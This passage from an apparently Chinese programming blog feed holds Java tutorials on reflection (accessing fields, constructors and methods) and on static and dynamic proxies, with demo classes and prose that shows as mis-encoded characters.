class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> String a;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getA</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setA</span><span class="hljs-params">(String a)</span> &#123;<br>        <span class="hljs-built_in">this</span>.a = a;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, a=&#x27;&quot;</span> + a + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;åƒé¥­&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰“ç¯®çƒ&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemogetDeclaredFieldsTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> personClass.getField(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> a.get(person);<br>        System.out.println(o);<br>        a.set(person,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        System.out.println(person);<br><br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥è·å–<code>private</code>å±æ€§çš„å€¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemogetDeclaredFieldsTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> personClass.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> name.get(person);<br>        System.out.println(o);<br>        name.set(person,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        System.out.println(person);<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±ä¸ä¸€ä¸€æ¼”ç¤ºäº†ã€‚</p><h4 id="æ„é€ å™¨"><a href="#æ„é€ å™¨" class="headerlink" title="æ„é€ å™¨"></a>æ„é€ å™¨</h4><ul><li>Constructor[] getConstructors()</li><li>Constructor getConstructor(ç±» &lt;?&gt; â€¦ parameterTypes)</li><li>Constructor getDeclaredConstructors()</li><li>Constructor getDeclaredConstructor(ç±» &lt;?&gt; â€¦ parameterTypes)</li></ul><p><strong>è®°å¾—ç»™Personæ·»åŠ æ„é€ æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoConstruct</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> personClass.getConstructor(String.class,<span class="hljs-type">int</span>.class,String.class);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-string">&quot;xsw6a&quot;</span>,<span class="hljs-number">11</span>,<span class="hljs-string">&quot;harworking&quot;</span>);<br>        System.out.println(o);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> personClass.getConstructor(String.class,<span class="hljs-type">int</span>.class,String.class);<span class="hljs-comment">//æ¯ä¸€ä¸ªæ„é€ æ–¹æ³•çš„å‚æ•°ç§ç±»ä¸ä¸€æ ·ï¼Œè¿™ä¸€æ­¥æ˜¯è·å–æ„é€ æ–¹æ³•</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252200686.png" alt="QQæˆªå›¾20220225220052"></p><p>å¦‚æœæ˜¯æ— å‚æ„é€ æ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨Classç±»å¯¹è±¡çš„newInstanceæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> personClass.newInstance();<br>System.out.println(o);<br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h4><ul><li><p>Method[] getMethods()&#x2F;&#x2F;è·å–æ‰€æœ‰ã€publicã€‘ä¿®é¥°çš„æ–¹æ³•ï¼Œçˆ¶ç±»Objectçš„æ–¹æ³•ä¹Ÿèƒ½çœ‹åˆ°</p></li><li><p>Method getMethod(String nameï¼Œç±» &lt;?&gt; â€¦ parameterTypes)</p></li><li><p>Method[] getDeclaredMethods()&#x2F;&#x2F;è·å–æ‰€æœ‰å£°æ˜æ–¹æ³• ä¸è€ƒè™‘ä¿®é¥°ç¬¦ ä¸è€ƒè™‘ç»§æ‰¿çš„æ–¹æ³•</p></li><li><p>Method getDeclaredMethod(String nameï¼Œç±» &lt;?&gt; â€¦ parameterTypes) ä¸è€ƒè™‘ä¿®é¥°ç¬¦ ä¸è€ƒè™‘ç»§æ‰¿çš„æ–¹æ³•</p><p><strong>æ— å‚æ•°ç±»å‹ã€‚</strong></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoMethod</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">eat</span> <span class="hljs-operator">=</span> personClass.getMethod(<span class="hljs-string">&quot;eat&quot;</span>);<span class="hljs-comment">//è·å–åˆ¶å®šåç§°çš„æ–¹æ³•</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<span class="hljs-comment">//è¿›è€Œæ‰§è¡Œæ–¹æ³•,ã€invokeã€‘ï¼Œå®ƒéœ€è¦ä¸€ä¸ªçœŸå®çš„å¯¹è±¡ï¼Œä»¥åŠæ–¹æ³•çš„å®é™…å‚æ•°åˆ—è¡¨</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">pp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-comment">//å› ä¸ºæ˜¯ç©ºå‚æ–¹æ³•ï¼Œæ‰€ä»¥ç›´æ¥æ”¾è¿›æ¥ä¸€ä¸ªå¯¹è±¡å°±è¡Œ</span><br>        <span class="hljs-comment">//æ‰§è¡Œæ–¹æ³•ï¼Œeat...</span><br>        eat.invoke(person);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>æœ‰å‚æ•°ç±»å‹</strong>ï¼ˆè®°å¾—æ”¹personç±»ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252218476.png" alt="QQæˆªå›¾20220225221351"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoMethodTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">eat</span> <span class="hljs-operator">=</span> personClass.getMethod(<span class="hljs-string">&quot;eatCan&quot;</span>, String.class);<span class="hljs-comment">//eatæ–¹æ³•é‡è½½ï¼Œeatæ–¹æ³•çš„éœ€è¦ä¼ å…¥çš„å‚æ•°æ˜¯Stringç±»å‹</span><br>        eat.invoke(person,<span class="hljs-string">&quot;æ°´æœ&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä¸ä¸€ä¸€å®ç°ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaä¸¤ç§ä»£ç†</title>
    <link href="/2022/02/25/Java%E4%B8%A4%E7%A7%8D%E4%BB%A3%E7%90%86/"/>
    <url>/2022/02/25/Java%E4%B8%A4%E7%A7%8D%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaä»£ç†"><a href="#Javaä»£ç†" class="headerlink" title="Javaä»£ç†"></a>Javaä»£ç†</h1><h2 id="é™æ€ä»£ç†"><a href="#é™æ€ä»£ç†" class="headerlink" title="é™æ€ä»£ç†"></a>é™æ€ä»£ç†</h2><p>ä¸ºä¸ä¿®æ”¹åŸå…ˆçš„ç±»ï¼Œè€Œåˆ›å»ºä»£ç†ç±»å»ä¿®æ”¹ã€‚</p><h3 id="ç”¨æˆ·æ¥å£"><a href="#ç”¨æˆ·æ¥å£" class="headerlink" title="ç”¨æˆ·æ¥å£"></a>ç”¨æˆ·æ¥å£</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserServices</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="å®ç°ç±»"><a href="#å®ç°ç±»" class="headerlink" title="å®ç°ç±»"></a>å®ç°ç±»</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">import</span> java.sql.SQLOutput;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserReal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserServices</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æŸ¥è¯¢&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;æ›´æ–°&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="ä»£ç†ç±»"><a href="#ä»£ç†ç±»" class="headerlink" title="ä»£ç†ç±»"></a>ä»£ç†ç±»</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserRealProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserServices</span> &#123;<br>    <span class="hljs-keyword">private</span> UserServices userServices; <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserRealProxy</span><span class="hljs-params">(UserServices userServices)</span> &#123;<br>        <span class="hljs-built_in">this</span>.userServices = userServices;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span> &#123;<br>        before();<br>        userServices.select();<br>        after();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>&#123;<br>        before();<br>        userServices.update();<br>        after();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;åœ¨è¿™ä¹‹å‰&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;åœ¨è¿™ä¹‹å&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„ç‚¹ï¼š</p><p>1ã€è¿™é‡Œçš„<code>private UserServices userServices;</code>ç›®çš„æ˜¯è§„èŒƒè¯<code>userServices</code></p><p>2ã€æ„é€ å‡½æ•°ï¼Œä¸ºäº†ä¼ å…¥ä»£ç†ç±»ã€‚</p><h3 id="å®ç°ç±»-1"><a href="#å®ç°ç±»-1" class="headerlink" title="å®ç°ç±»"></a>å®ç°ç±»</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">UserServices</span> <span class="hljs-variable">userReal</span> <span class="hljs-operator">=</span> (UserServices) <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserReal</span>();<br>        <span class="hljs-type">UserRealProxy</span> <span class="hljs-variable">userRealProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserRealProxy</span>(userReal);<br>        userRealProxy.select();<br>        userRealProxy.update();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252045862.png" alt="QQæˆªå›¾20220225145647"></p><p>ä»£ç†ç±»å®ç°äº†ä¸ä¿®æ”¹æºä»£ç è€Œæ”¹å˜äº†è¾“å‡ºç»“æœï¼ˆæ·»åŠ äº†åœ¨è¿™ä¹‹å‰ä¸ä¹‹åï¼‰ã€‚</p><p>ä½†æ˜¯å®é™…åº”ç”¨ä¸­ç”¨åˆ°çš„é™æ€ä»£ç†å¾ˆå°‘å¾ˆå°‘ã€‚å› ä¸ºï¼š</p><p>1ã€å½“éœ€è¦ä»£ç†å¤šä¸ªç±»çš„æ—¶å€™ï¼Œç”±äºä»£ç†å¯¹è±¡è¦å®ç°ä¸ç›®æ ‡å¯¹è±¡ä¸€è‡´çš„æ¥å£ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š</p><ul><li>åªç»´æŠ¤ä¸€ä¸ªä»£ç†ç±»ï¼Œç”±è¿™ä¸ªä»£ç†ç±»å®ç°å¤šä¸ªæ¥å£ï¼Œä½†æ˜¯è¿™æ ·å°±å¯¼è‡´<strong>ä»£ç†ç±»è¿‡äºåºå¤§</strong></li><li>æ–°å»ºå¤šä¸ªä»£ç†ç±»ï¼Œæ¯ä¸ªç›®æ ‡å¯¹è±¡å¯¹åº”ä¸€ä¸ªä»£ç†ç±»ï¼Œä½†æ˜¯è¿™æ ·ä¼š<strong>äº§ç”Ÿè¿‡å¤šçš„ä»£ç†ç±»</strong></li></ul><p>2ã€å½“æ¥å£éœ€è¦å¢åŠ ã€åˆ é™¤ã€ä¿®æ”¹æ–¹æ³•çš„æ—¶å€™ï¼Œç›®æ ‡å¯¹è±¡ä¸ä»£ç†ç±»éƒ½è¦åŒæ—¶ä¿®æ”¹ï¼Œ<strong>ä¸æ˜“ç»´æŠ¤</strong>ã€‚</p><h2 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h2><p>é¦–å…ˆè¦äº†è§£ä¸€ä¸ªç±»å’Œä¸€ä¸ªæ¥å£ï¼š</p><ul><li><code>java.lang.reflect.Proxy</code>ï¼ˆç±»ï¼‰</li><li><code>java.lang.reflect.InvocationHandler</code>ï¼ˆæ¥å£ï¼‰</li></ul><p><code>java.lang.reflect.Proxy</code>ä¸»è¦ç”¨äºç”ŸæˆåŠ¨æ€ä»£ç†ç±»Classã€åˆ›å»ºä»£ç†ç±»å®ä¾‹ï¼Œè¯¥ç±»å®ç°äº†<code>java.io.Serializable</code>æ¥å£ã€‚</p><p><strong>Proxy</strong>ï¼šæ˜¯æ‰€æœ‰åŠ¨æ€ä»£ç†çš„çˆ¶ç±»ï¼Œè´Ÿè´£newä¸€ä¸ªå®ä¾‹ã€‚<br><strong>InvocationHandler</strong>ï¼šç”¨äºè°ƒç”¨<code>Proxy</code>ç±»ç”Ÿæˆçš„ä»£ç†ç±»æ–¹æ³•ï¼Œè¯¥ç±»åªæœ‰ä¸€ä¸ª<code>Invoke</code>æ–¹æ³•ï¼ˆä»£ç†å¯¹è±¡è¦æ‰§è¡Œçš„åŠŸèƒ½ä»£ç ï¼‰ã€‚å¹¶ä¸”æ¯ä¸€ä¸ªç±»éƒ½è¦å®ç°<code>IncocationHandler</code>è¿™ä¸ªæ¥å£ã€‚</p><h3 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h3><p>å¿«æ·é”®Ctrl+shift+fï¼Œæœç´¢<code>public class Proxy implements java.io.Serializable</code>å¯æ‰¾åˆ°è¯¥ç±»ã€‚è¿™é‡Œå¼•ç”¨åˆ«çš„å¸ˆå‚…çš„ç¿»è¯‘ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java">copypackage java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br><br>  <span class="hljs-comment">// çœå»æˆå‘˜å˜é‡å’Œéƒ¨åˆ†ç±»æ–¹æ³•...</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * è·å–åŠ¨æ€ä»£ç†å¤„ç†ç±»å¯¹è±¡</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy è¿”å›è°ƒç”¨å¤„ç†ç¨‹åºçš„ä»£ç†å®ä¾‹</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> ä»£ç†å®ä¾‹çš„è°ƒç”¨å¤„ç†ç¨‹åº</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException å¦‚æœå‚æ•°ä¸æ˜¯ä¸€ä¸ªä»£ç†å®ä¾‹</span><br><span class="hljs-comment">     */</span><br>    <span 